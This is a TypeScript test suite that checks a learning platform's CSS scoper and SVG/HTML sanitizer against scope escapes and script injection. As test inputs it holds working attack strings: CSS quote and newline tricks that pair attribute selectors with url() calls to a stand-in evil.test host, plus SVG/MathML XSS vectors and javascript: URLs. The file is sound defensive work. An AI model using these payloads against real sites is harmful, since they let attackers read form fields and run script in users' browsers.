/**
 * CSS sanitizer + scoper invariants.
 *
 * Author CSS reaches learners from three places — HTML lessons, certificates and
 * site pages — and in all three the promise is the same: whatever the author
 * wrote, the emitted stylesheet can only style the author's own block. A rule
 * that lands outside the scope restyles first-party UI (the nav, a login form)
 * and, with an attribute selector and a remote `url()`, can read it too.
 *
 * The checks below do not trust the sanitizer's own idea of where a rule ends.
 * They re-parse its OUTPUT with a small tokenizer that follows the browser's
 * rules for strings, escapes, comments and blocks, and assert that every rule
 * the browser would see is scoped. The sanitizer and the browser disagreeing
 * about where a string closes is exactly how a scope escape happens, so the
 * referee has to be independent of the thing it is judging.
 *
 * Pure logic only — no database, no network.
 *
 *   npm run verify:sanitizer
 */
import { sanitizeAndScopeCss, sanitizeDeclarations, scopeSelectorFor } from "../lib/content/sanitize-css";
import { sanitizeHtml } from "../lib/content/sanitize-html";

let failed = 0;

function check(label: string, actual: unknown, expected: unknown) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  const ok = a === e;
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}${ok ? "" : `\n      got  ${a}\n      want ${e}`}`);
}

const { selector: SCOPE } = scopeSelectorFor("t");
const scope = (css: string) => sanitizeAndScopeCss(css, SCOPE);

/* -------------------------------------------------------------------------- */
/* Reference parser: split a stylesheet the way a browser would                */
/* -------------------------------------------------------------------------- */

type ParsedRule = { prelude: string; block: string | null };

function parseRules(css: string): ParsedRule[] {
  const n = css.length;
  const rules: ParsedRule[] = [];

  // A string ends at its closing quote, or — unterminated — at the first raw
  // newline (a "bad string"). A backslash escapes whatever follows it.
  function afterString(start: number): number {
    const quote = css[start];
    let j = start + 1;
    while (j < n) {
      const c = css[j];
      if (c === "\\") {
        j += 2;
        continue;
      }
      if (c === "\n") return j;
      if (c === quote) return j + 1;
      j++;
    }
    return n;
  }

  function afterComment(start: number): number {
    const end = css.indexOf("*/", start + 2);
    return end === -1 ? n : end + 2;
  }

  function afterBlock(start: number): number {
    const open = css[start];
    const close = open === "{" ? "}" : open === "(" ? ")" : "]";
    let j = start + 1;
    while (j < n) {
      const c = css[j];
      if (c === "\\") j += 2;
      else if (c === "/" && css[j + 1] === "*") j = afterComment(j);
      else if (c === '"' || c === "'") j = afterString(j);
      else if (c === "{" || c === "(" || c === "[") j = afterBlock(j);
      else if (c === close) return j + 1;
      else j++;
    }
    return n;
  }

  let i = 0;
  while (i < n) {
    if (/\s/.test(css[i])) {
      i++;
      continue;
    }
    if (css[i] === "/" && css[i + 1] === "*") {
      i = afterComment(i);
      continue;
    }

    const start = i;
    const isAtRule = css[i] === "@";
    let j = i;
    let blockStart = -1;

    while (j < n) {
      const c = css[j];
      if (c === "\\") j += 2;
      else if (c === "/" && css[j + 1] === "*") j = afterComment(j);
      else if (c === '"' || c === "'") j = afterString(j);
      else if (c === "(" || c === "[") j = afterBlock(j);
      else if (c === "{") {
        blockStart = j;
        break;
      } else if (c === ";" && isAtRule) break;
      else j++;
    }

    if (blockStart === -1) {
      const prelude = css.slice(start, j).trim();
      if (prelude) rules.push({ prelude, block: null });
      i = j + 1;
      continue;
    }

    const end = afterBlock(blockStart);
    rules.push({
      prelude: css.slice(start, blockStart).trim(),
      block: css.slice(blockStart + 1, Math.max(blockStart + 1, end - 1)),
    });
    i = end;
  }

  return rules;
}

/** Split a selector list on top-level commas, honouring strings and brackets. */
function splitSelectors(list: string): string[] {
  const parts: string[] = [];
  let depth = 0;
  let quote: string | null = null;
  let start = 0;
  for (let i = 0; i < list.length; i++) {
    const c = list[i];
    if (c === "\\") {
      i++;
      continue;
    }
    if (quote) {
      if (c === quote) quote = null;
      continue;
    }
    if (c === '"' || c === "'") quote = c;
    else if (c === "(" || c === "[") depth++;
    else if (c === ")" || c === "]") depth--;
    else if (c === "," && depth === 0) {
      parts.push(list.slice(start, i));
      start = i + 1;
    }
  }
  parts.push(list.slice(start));
  return parts.map((p) => p.trim());
}

const NESTED = new Set(["media", "supports", "container", "layer", "scope"]);
const KEYFRAMES = new Set(["keyframes", "-webkit-keyframes"]);
const DECLARATION_ONLY = new Set(["font-face", "page", "counter-style"]);
const KEYFRAME_STOP = /^(?:from|to|\d+(?:\.\d+)?%)(?:\s*,\s*(?:from|to|\d+(?:\.\d+)?%))*$/i;

/**
 * Every problem a browser would have with `css` as a scoped stylesheet.
 * Empty array = every rule is confined to the scope.
 */
function scopeViolations(css: string): string[] {
  const problems: string[] = [];

  function walk(source: string) {
    for (const rule of parseRules(source)) {
      if (rule.prelude.startsWith("@")) {
        const name = (/^@([a-zA-Z-]+)/.exec(rule.prelude)?.[1] ?? "").toLowerCase();
        if (rule.block === null) {
          problems.push(`statement at-rule survived: ${rule.prelude}`);
        } else if (NESTED.has(name)) {
          walk(rule.block);
        } else if (KEYFRAMES.has(name)) {
          for (const stop of parseRules(rule.block)) {
            if (stop.block === null || !KEYFRAME_STOP.test(stop.prelude)) {
              problems.push(`bad keyframe stop: ${stop.prelude}`);
            }
          }
        } else if (DECLARATION_ONLY.has(name)) {
          if (/[{}]/.test(rule.block)) problems.push(`nested block inside @${name}`);
        } else {
          problems.push(`unexpected at-rule: @${name}`);
        }
        continue;
      }

      if (rule.block === null) {
        problems.push(`stray text at rule level: ${rule.prelude}`);
        continue;
      }
      for (const part of splitSelectors(rule.prelude)) {
        if (part !== SCOPE && !part.startsWith(`${SCOPE} `)) {
          problems.push(`unscoped selector: ${part}`);
        } else if (/^\s*[+~]/.test(part.slice(SCOPE.length))) {
          problems.push(`selector reaches the scope's siblings: ${part}`);
        }
      }
      if (/[{}]/.test(rule.block)) problems.push(`nested block inside ${rule.prelude}`);
    }
  }

  walk(css);
  return problems;
}

/**
 * The invariant: whatever comes out, the browser sees only scoped rules.
 *
 * Note this does NOT assert the smuggled rule disappears. Once the scanner
 * reads the stylesheet the way a browser does, `html input{…}` is just another
 * rule in the author's CSS, and it is emitted like any other — scoped.
 */
function confined(label: string, input: string) {
  check(`${label}: every emitted rule is scoped`, scopeViolations(scope(input)), []);
}

/* -------------------------------------------------------------------------- */
/* The referee itself                                                          */
/* -------------------------------------------------------------------------- */

// If the reference parser cannot see an escape, every check below is vacuous.
check(
  "referee sees a rule that follows a string ending in an escaped backslash",
  scopeViolations(`${SCOPE} .x { content: "\\\\"} html input{color:red} .z{content:" }`),
  ["unscoped selector: html input", "unscoped selector: .z"]
);

check(
  "referee accepts a plain scoped stylesheet",
  scopeViolations(`${SCOPE} .a { color: red }\n@media (min-width: 40em) { ${SCOPE} .b { color: blue } }`),
  []
);

/* -------------------------------------------------------------------------- */
/* Scope escapes                                                               */
/* -------------------------------------------------------------------------- */

// `"\\"` is a complete string holding one backslash. Reading the closing quote
// as escaped makes the scanner think the string runs on, so it swallows the
// `}` and the unscoped rule after it into a single "declaration value".
confined(
  "escaped backslash before a closing quote",
  `.x{content:"\\\\"} html input[value^=a]{background:url(https://evil.test/a)} .z{content:"}`
);

check(
  "escaped backslash: the rule that used to escape is now read as a rule, and scoped",
  scope(`.x{content:"\\\\"} html input[value^=a]{background:url(https://evil.test/a)}`),
  `${SCOPE} .x { content: "\\\\" }\n${SCOPE} input[value^=a] { background: url(https://evil.test/a) }`
);

confined(
  "escaped backslash, single quotes",
  `.x{content:'\\\\'} html input[value^=a]{background:url(https://evil.test/a)} .z{content:'}`
);

// A raw newline ends a string in the browser (as a bad string). A scanner that
// lets the string run across the newline is out of step from that point on.
confined(
  "raw newline inside a string",
  `.x{content:"a\n} html body{background:url(https://evil.test/b)} .y{content:"}`
);

confined(
  "carriage return inside a string",
  `.x{content:"a\r} html body{background:url(https://evil.test/b)} .y{content:"}`
);

// At-rule preludes are re-emitted verbatim, so the same trick works there and
// the smuggled rule never passes through the declaration checks at all.
confined(
  "quote trick inside an at-rule prelude",
  `@keyframes x (a:"\\\\") {} html{background:url(https://evil.test/c)} .q{content:")y{from{color:red}}`
);

confined(
  "quote trick inside a keyframe stop selector",
  `@keyframes k{ "\\\\"}} html{background:url(https://evil.test/d)} .q{content:"x{color:red} }`
);

confined(
  "unquoted url() containing a quote",
  `.x{background:url(a"b)} html{background:url(https://evil.test/e)} .y{content:"}`
);

// CSS nesting: a rule inside a rule's block is a real rule, and `&`/`:has()`
// let it reach back out of the scope.
confined(
  "nested rule inside a declaration block",
  `.x{color:red; html:has(&) input{background:url(https://evil.test/f)}}`
);

confined(
  "nested rule using the nesting selector",
  `.x{color:red; & ~ * {background:url(https://evil.test/g)}}`
);

// The scope is added as an ancestor, so a selector that starts with a sibling
// combinator would end up selecting what comes AFTER the block.
check(
  "leading sibling combinator cannot reach the scope's siblings",
  scopeViolations(scope(`~ .site-footer{display:none} + *{color:red} .ok{color:blue}`)),
  []
);

check(
  "page-level selector followed by a sibling combinator cannot reach the scope's siblings",
  scopeViolations(scope(`body ~ .site-footer{display:none} html + *{color:red} .ok{color:blue}`)),
  []
);

check(
  "a harmless rule beside the rejected ones still survives",
  scope(`~ .site-footer{display:none} .ok{color:blue}`),
  `${SCOPE} .ok { color: blue }`
);

// `@property` registers a custom property for the whole document, including
// first-party variables. Nothing an author needs it for is worth that.
check("@property is dropped", scope(`@property --brand{syntax:"*";inherits:true;initial-value:red}`), "");

check(
  "an unterminated comment cannot swallow later rules",
  scopeViolations(scope(`.a{color:red; x: /*} .b{color:blue}`)),
  []
);

check(
  "unbalanced brackets in a selector are dropped rather than emitted",
  scope(`a[title="x{color:red} .b{color:blue}`),
  ""
);

/* -------------------------------------------------------------------------- */
/* Still-banned content                                                        */
/* -------------------------------------------------------------------------- */

check("@import is dropped", scope(`@import url(https://evil.test/x.css); .a{color:red}`), `${SCOPE} .a { color: red }`);

check(
  "javascript: url is dropped, its neighbours kept",
  scope(`.a{color:red;background:url(javascript:alert(1));margin:0}`),
  `${SCOPE} .a { color: red; margin: 0 }`
);

check("expression() is dropped", scope(`.a{width:expression(alert(1))}`), "");

check(
  "a value that would close the <style> element is dropped",
  scope(`.a{content:"</style><script>alert(1)</script>"}`),
  ""
);

check("inline style: banned property removed", sanitizeDeclarations("color:red;behavior:url(x.htc)"), "color: red");

check("inline style: braces cannot smuggle a rule", sanitizeDeclarations("color:red;x:a}html{color:blue"), "color: red");

/* -------------------------------------------------------------------------- */
/* Ordinary CSS must keep working                                              */
/* -------------------------------------------------------------------------- */

check("plain rule", scope(`.card{color:red}`), `${SCOPE} .card { color: red }`);

check("body paints the block itself", scope(`body{background:#000}`), `${SCOPE} { background: #000 }`);

check("leading body selector", scope(`body .card{color:red}`), `${SCOPE} .card { color: red }`);

check(
  "selector list",
  scope(`h1, h2{margin:0}`),
  `${SCOPE} h1, ${SCOPE} h2 { margin: 0 }`
);

check(
  "comma inside an attribute value is not a selector separator",
  scope(`[title="a,b"]{color:blue}`),
  `${SCOPE} [title="a,b"] { color: blue }`
);

check(
  "a string holding one escaped backslash survives intact",
  scope(`.q::before{content:"\\\\"}`),
  `${SCOPE} .q::before { content: "\\\\" }`
);

check(
  "escaped quote inside a string",
  scope(`.q::before{content:"say \\"hi\\""}`),
  `${SCOPE} .q::before { content: "say \\"hi\\"" }`
);

check(
  "escaped characters in a class name (compiled utility CSS)",
  scope(`.md\\:flex{display:flex} .w-1\\/2{width:50%}`),
  `${SCOPE} .md\\:flex { display: flex }\n${SCOPE} .w-1\\/2 { width: 50% }`
);

check(
  "font stack with a quoted family",
  scope(`.a{font-family:"Helvetica Neue", Arial, sans-serif}`),
  `${SCOPE} .a { font-family: "Helvetica Neue", Arial, sans-serif }`
);

check(
  "remote image",
  scope(`.hero{background:url("https://example.com/a.png") center / cover}`),
  `${SCOPE} .hero { background: url("https://example.com/a.png") center / cover }`
);

check(
  "data url containing a semicolon",
  scope(`.a{background:url(data:image/png;base64,AAAA)}`),
  `${SCOPE} .a { background: url(data:image/png;base64,AAAA) }`
);

check(
  "custom property and var()",
  scope(`.bar{--value: 72; width:calc(var(--value) * 1%)}`),
  `${SCOPE} .bar { --value: 72; width: calc(var(--value) * 1%) }`
);

check(
  "media query",
  scope(`@media (min-width: 40em){.a{display:none}}`),
  `@media (min-width: 40em) { ${SCOPE} .a { display: none } }`
);

check(
  "keyframes",
  scope(`@keyframes spin{from{transform:rotate(0)}50%{opacity:.5}to{transform:rotate(360deg)}}`),
  `@keyframes spin { from { transform: rotate(0) } 50% { opacity: .5 } to { transform: rotate(360deg) } }`
);

check(
  "font-face",
  scope(`@font-face{font-family:"Brand";src:url(https://example.com/brand.woff2)}`),
  `@font-face { font-family: "Brand"; src: url(https://example.com/brand.woff2) }`
);

check(
  "print page size (certificates rely on this)",
  scope(`@page{size:A4 landscape;margin:0}`),
  `@page { size: A4 landscape; margin: 0 }`
);

check(
  "multi-line stylesheet",
  scope(`.a {\n  color: red;\n  margin: 0;\n}\n\n.b {\n  color: blue;\n}\n`),
  `${SCOPE} .a { color: red; margin: 0 }\n${SCOPE} .b { color: blue }`
);

check("comments are removed", scope(`/* note */ .a{color:red /* inline */}`), `${SCOPE} .a { color: red }`);

/* -------------------------------------------------------------------------- */
/* Inline SVG                                                                  */
/* -------------------------------------------------------------------------- */

// Diagrams are allowed as a small subset of SVG: shapes, text, gradients. Each
// of these is a way an SVG reaches outside its own box, and each must come out
// with nothing left that can run, load or link.

const svg = (inner: string) => sanitizeHtml(`<svg viewBox="0 0 10 10">${inner}</svg>`);

/** Nothing executable, nothing that fetches, nothing that links, in any spelling. */
function inert(label: string, html: string) {
  const sanitized = sanitizeHtml(html);
  // Judge the markup, not the text inside attribute values: the sanitizer
  // writes every value quoted and escaped, so `title="… onerror=…"` is a
  // string, not a handler. What matters is whether any ATTRIBUTE is one.
  const out = sanitized.replace(/"[^"]*"/g, '""');
  const problems = [
    /<\s*script/i.test(out) && "a script element",
    /\son[a-z]+\s*=/i.test(out) && "an event-handler attribute",
    // URLs live INSIDE attribute values, so these two read the raw output.
    /=\s*"\s*javascript:/i.test(sanitized) && "a javascript: URL",
    /<\s*(?:foreignobject|use|image|animate|animatetransform|animatemotion|set|style|filter|mask|pattern|clippath|marker|iframe|object|embed)\b/i.test(out) &&
      "a disallowed element",
    /xlink:href/i.test(out) && "xlink:href",
    /<\s*(?:svg|g|path|rect|circle|text)\b[^>]*\shref\s*=/i.test(out) && "href on an SVG element",
    /=\s*"[^"]*url\(\s*(?!#)/i.test(sanitized) && "a url() that is not a local reference",
  ].filter(Boolean);
  check(label, problems, []);
}

check(
  "a plain diagram survives, attributes and all",
  sanitizeHtml(
    '<svg viewBox="0 0 320 80" role="img" aria-label="Two steps"><rect x="8" y="20" width="120" height="40" rx="8" fill="none" stroke="currentColor" stroke-width="2"/><text x="68" y="45" text-anchor="middle" fill="currentColor" font-size="14">First</text><path d="M132 40h52" fill="none" stroke="currentColor"/></svg>'
  ),
  '<svg viewbox="0 0 320 80" role="img" aria-label="Two steps"><rect x="8" y="20" width="120" height="40" rx="8" fill="none" stroke="currentColor" stroke-width="2"></rect><text x="68" y="45" text-anchor="middle" fill="currentColor" font-size="14">First</text><path d="M132 40h52" fill="none" stroke="currentColor"></path></svg>'
);

check(
  "gradients survive, and a shape may refer to one in the same drawing",
  svg('<defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="red"/></linearGradient></defs><rect fill="url(#g)"/>'),
  '<svg viewbox="0 0 10 10"><defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="red"></stop></linearGradient></defs><rect fill="url(#g)"></rect></svg>'
);

check(
  "a paint that points outside the page is removed; a local one beside it stays",
  svg('<rect fill="url(https://evil.test/track)" stroke="url(#ok)"/><stop stop-color="url(javascript:alert(1))"/>'),
  '<svg viewbox="0 0 10 10"><rect stroke="url(#ok)"></rect><stop></stop></svg>'
);

check(
  "foreignObject is removed together with the HTML inside it, however it is spelt",
  svg('<foreignObject><div>hi<img src=x onerror=alert(1)></div></foreignObject><FOREIGNOBJECT><b>caps</b></FOREIGNOBJECT><rect/>'),
  '<svg viewbox="0 0 10 10"><rect></rect></svg>'
);

check(
  "a style element inside a drawing is removed with its contents",
  svg("<style>*{display:none}</style><rect/>"),
  '<svg viewbox="0 0 10 10"><rect></rect></svg>'
);

inert("script and event handlers", '<svg onload="alert(1)"><script>alert(1)</script><circle r="4" onclick="alert(1)" onmouseover="x()"/></svg>');
inert("use and image cannot load another document", '<svg><use href="https://evil.test/x.svg#a" xlink:href="https://evil.test/y.svg#b"/><image href="https://evil.test/p.png" xlink:href="//evil.test/q.png"/></svg>');
inert("links and animation cannot carry a javascript: URL", '<svg><a xlink:href="javascript:alert(1)" href="javascript:alert(2)"><text>go</text></a><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="onload" to="alert(1)"/></svg>');
inert("title and desc cannot smuggle markup", "<svg><title><img src=x onerror=alert(1)></title><desc><script>alert(1)</script></desc></svg>");
inert("a CDATA section stays text", "<svg><![CDATA[<script>alert(1)</script>]]></svg>");
inert("filters, masks, patterns and markers are not part of the subset", '<svg><filter id="f"><feImage href="https://evil.test/i.png"/></filter><mask id="m"/><pattern id="p"><image href="https://evil.test/p.png"/></pattern><marker id="k"/><clipPath id="c"/><rect filter="url(#f)" mask="url(#m)" clip-path="url(#c)"/></svg>');
inert("inline style on a shape is cleaned like any other", '<svg><rect style="fill:red;background:url(javascript:alert(1));behavior:url(x.htc)"/></svg>');
inert("MathML is not a way round it", '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;"></mglyph></table></mtext></math>');
inert("an SVG nested in an SVG gets no extra privileges", '<svg><svg onload="alert(1)"><foreignObject><iframe src="https://evil.test"></iframe></foreignObject><script>alert(1)</script></svg></svg>');

check(
  "SVG names used outside a drawing are just unknown tags",
  sanitizeHtml("<div><foreignObject><i>x</i></foreignObject><use href=\"#a\"></use></div>"),
  "<div></div>"
);

console.log(failed === 0 ? "\nAll sanitizer checks passed." : `\n${failed} sanitizer check(s) FAILED.`);
process.exit(failed === 0 ? 0 : 1);
